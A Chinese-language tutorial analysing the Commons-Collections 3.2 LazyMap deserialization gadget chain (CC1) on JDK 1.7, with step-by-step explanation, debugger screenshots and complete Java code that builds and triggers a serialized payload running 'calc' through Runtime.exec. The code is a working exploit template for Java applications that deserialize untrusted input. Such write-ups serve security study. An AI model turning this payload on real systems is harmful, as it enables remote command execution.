## 运行环境

jdk版本：1.7.0_80

commons-collections-3.2

## 调用链

    
    
    //     ObjectInputStream.readObject()  
    //       AnnotationInvocationHandler.readObject()  
    //          Map(Proxy).entrySet()  
    //             AnnotationInvocationHandler.invoke()  
    //                LazyMap.get()  
    //                   ChainedTransformer.transform()  
    //                      ConstantTransformer.transform()  
    //                      InvokerTransformer.transform()  
    //                         Method.invoke()  
    //                            Class.getMethod()  
    //                      InvokerTransformer.transform()  
    //                         Method.invoke()  
    //                            Runtime.getRuntime()  
    //                      InvokerTransformer.transform()  
    //                         Method.invoke()  
    //                            Runtime.exec()  
    //

## 调用流程

### 危险方法执行链

LazyMap危险方法执行链和TransformedMap的一样，调用InvokerTransformer.transform方法。具体代码如下

    
    
    Transformer[] Transformer = new Transformer[]{  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
      
    };  
    ChainedTransformer C = new ChainedTransformer(Transformer);

### LazyMap.get()

LazyMap的get()方法调用了this.factory.transform()方法，且this.factory为构造LazyMap时传入的Transformer对象。因此我们可以把构造好的ChainedTransformer对象在构造LazyMap中传入，并想办法调用LazyMap的get()方法。

![1684161649_64624471ab59b5b8afd3c.png!small?1684161651155](https://image.3001.net/images/20230515/1684161649_64624471ab59b5b8afd3c.png!small?1684161651155)

  

  

  

  

  

  

  

  

![1684161669_646244857682464eb6336.png!small?1684161670928](https://image.3001.net/images/20230515/1684161669_646244857682464eb6336.png!small?1684161670928)

  

  

  

### AnnotationInvocationHandler.invoke()

AnnotionInvocationHandler.invoke()中有调用this.memberValues.get()方法。在TransformedMap链中提到过this.memberValues可控，可在构造AnnotionInvocationHandler传入。

![1684161916_6462457ce6107783bc7de.png!small?1684161918598](https://image.3001.net/images/20230515/1684161916_6462457ce6107783bc7de.png!small?1684161918598)

  

  

  

  

  

  

  

  

  

在此我们可以通过动态代理的方式调用invoke方法。动态代理调用代理对象的任意方法时，都会执行调用处理程序（InvocationHandler）的invoke方法，AnnotionInvocationHandler刚好是一个调用处理程序。因此可以创建一个动态代理对象，并把装载LazyMap的AnnotionInvocationHandler作为代理对象的调用处理程序。结合上面的危险方法执行链，具体构造如下

    
    
    Transformer[] Transformer = new Transformer[]{  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
      
    };  
    ChainedTransformer C = new ChainedTransformer(Transformer);  
      
    HashMap <Object,Object> a = new HashMap<>();  
      
    Map map = LazyMap.decorate(a,C);  
      
    Class anclass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
    Constructor constructor = anclass.getDeclaredConstructor(Class.class,Map.class);  
    constructor.setAccessible(true);  
    InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class,map);  
    Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), HashMap.class.getInterfaces(),invocationHandler);

在生成LazyMap时，将危险函数执行链传入。通过反射生成AnnotionInvocationHandler，并将LazyMap传入。构造Map类型的动态代理对象，传入三个参数，第一个为代理目标的类加载器，第二个为代理目标的接口，第三个为调用处理程序，在第三个参数中传入AnnotionInvocationHandler。此时代理对象proxyMap执行任何方法时，都会触发AnnotionInvocationHandler执行Invoke方法。

### AnnotationInvocationHandler.readObject()

AnnotationInvocationHandler.readObject中存在对this.memberValues对象的方法调用。

![1684245273_64638b19c62e072e62cfa.png!small?1684245273841](https://image.3001.net/images/20230516/1684245273_64638b19c62e072e62cfa.png!small?1684245273841)

  

  

  

  

  

把代理对象proxyMap作为AnnotationInvocationHandler的this.memberValues，反序列化时在AnnotationInvocationHandler.readObject中使proxyMap执行entrySet()方法，触发调用处理程序AnnotionInvocationHandler执行AnnotionInvocationHandler.Invoke(),在Invoke中LazyMap的get方法。根据以上描述构造payload如下

    
    
    //    private void cc1_lazymap() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {  
    //        Transformer[] Transformer = new Transformer[]{  
    //                new ConstantTransformer(Runtime.class),  
    //                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
    //                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
    //                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
    //  
    //        };  
    //        ChainedTransformer C = new ChainedTransformer(Transformer);  
    //  
    //        HashMap <Object,Object> a = new HashMap<>();  
    //  
    //        Map map = LazyMap.decorate(a,C);  
    //  
    //        //反射生成AnnotationInvocationHandler对象  
    //        Class anclass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
    //        Constructor constructor = anclass.getDeclaredConstructor(Class.class,Map.class);  
    //        constructor.setAccessible(true);  
    //        //LazyMap装入AnnotationInvocationHandler中  
    //        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class,map);  
    //        //创建代理对象，并指定调用处理程序为AnnotationInvocationHandler  
    //        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), HashMap.class.getInterfaces(),invocationHandler);  
    //  
    //        //代理对象proxyMap装入AnnotationInvocationHandler2中  
    //        InvocationHandler invocationHandler2  =(InvocationHandler) constructor.newInstance(Target.class,proxyMap);  
    //  
    //  
    //        //序列化  
    //        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("a.bin"));  
    //        outputStream.writeObject(invocationHandler2);  
    //        //反序列化  
    //        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("a.bin"));  
    //        inputStream.readObject();

  

## 执行调试

反序列化时调用AnnotationInvocationHandler.readObject，在readObject中代理对象执行entrySet方法。

![1684248105_646396291ef8d479ee2ef.png!small?1684248105479](https://image.3001.net/images/20230516/1684248105_646396291ef8d479ee2ef.png!small?1684248105479)

  

  

  

  

  

![1684248132_6463964471ae85fa21e0d.png!small?1684248132751](https://image.3001.net/images/20230516/1684248132_6463964471ae85fa21e0d.png!small?1684248132751)

  

  

  

  

  

  

调用entrySet时触发调用处理程序，执行AnnotationInvocationHandler.Invoke()

![1684248312_646396f80a8b4da6165f3.png!small?1684248312561](https://image.3001.net/images/20230516/1684248312_646396f80a8b4da6165f3.png!small?1684248312561)

  

  

  

  

在Invoke()中执行LazyMap.get()

![1684248350_6463971e84877f000ef5f.png!small?1684248350641](https://image.3001.net/images/20230516/1684248350_6463971e84877f000ef5f.png!small?1684248350641)

  

  

  

  

  

LazyMap.get()中执行transform()方法，后续调用Transform[]危险方法执行链，完成危险方法调用。

###
通过动态代理调用LazyMap的get方法在JDK8u71后的版本已不适用，后续将介绍通过HashMap触发get方法，此条链不受JDK版本影响（1.7
1.8）

  

  

  

  

  

  

  

  

  

  

  

  

  

